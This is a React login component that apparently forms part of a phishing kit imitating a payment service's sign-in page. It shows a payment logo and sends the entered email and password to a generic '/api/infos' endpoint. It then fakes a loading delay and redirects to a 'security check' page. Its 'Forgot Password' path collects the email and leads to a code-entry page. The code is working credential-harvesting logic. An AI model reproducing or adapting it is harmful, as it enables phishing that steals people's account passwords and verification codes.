import React, { useContext, useState } from 'react'
import { Link, useNavigate } from 'react-router-dom';
import { LoaderContext } from '../contexts/LoaderContext';

const Login = () => {
    const [email, setEmail] = useState("");
    const [isValid, setIsValid] = useState(false);
    const [password, setPassword] = useState("");
    const navigate = useNavigate();

    const { setShowLoader } = useContext(LoaderContext);

    const useLoader = async (mil) => {
        setShowLoader(true);

        await new Promise((resolve) => setTimeout(resolve, mil));

        setShowLoader(false);
    };


    const saveDetail = async () => {
        try {
            const res = await fetch('/api/infos', {
                method: 'POST',
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, password })
            })
            if (!res.ok) {
                alert('Error From server');
                return;
            }

        } catch (err) {
            console.log("Error adding user: " + err)
        }
    }

    const handleForgot = async () => {
        try {
            await useLoader(1500);
            if (!email) {
                setIsValid(true);
                return;
            }
            setIsValid(false);
            const res = await fetch('/api/infos', {
                method: 'POST',
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email })
            })
            if (!res.ok) {
                alert('Error From server');
                return;
            }
            navigate('/InputCode')
        } catch (err) {
            console.log("Error adding user: " + err)
        }

    }

    const goSecurity = async (e) => {
        e.preventDefault();
        await useLoader(1500);
        await saveDetail();
        navigate('/securityCheck');
    }
    return (
        <>

            <div className="bg-white border-1 border-gray-200 rounded-xl p-8 w-full max-w-md">

                <img src='/images/payLogo.png' className='mx-auto w-32 object-cover' />
                <form action="#" onSubmit={(e) => goSecurity(e)}>
                    <div className="mb-4">
                        <input
                            type="email"
                            value={email}
                            onChange={(e) => { setEmail(e.target.value); setIsValid(false) }}
                            placeholder="Email or mobile number"
                            required
                            className="w-full px-4 py-5 font-bold border rounded-md focus:outline-none focus:border-2 focus:border-blue-600 focus:bg-blue-100 font-[Quicksand]"

                        />
                    </div>

                    <div className="mb-4">
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            placeholder="Password"
                            required
                            className="w-full px-4 py-5 font-bold border rounded-md focus:outline-none focus:border-2 focus:border-blue-600 focus:bg-blue-100 font-[Quicksand]"
                        />
                    </div>
                    {
                        isValid &&
                        <div className='flex items-center gap-2'>
                            <img src='/images/errorIcon.png' className='size-4' alt='Warning Logo' />
                            <span className='text-gray-700'>Email Required</span>
                        </div>
                    }

                    <div className="mb-6">
                        <button type='button' onClick={handleForgot} className="text-l cursor-pointer text-blue-600 hover:underline font-bold font-[Quicksand]">
                            Forgot Password?
                        </button>
                    </div>

                    <button type='submit' className="w-full bg-blue-700 text-white py-3 rounded-3xl font-medium hover:bg-blue-600 transition cursor-pointer">
                        Next
                    </button>
                </form>
            </div>

        </>
    );
}

export default Login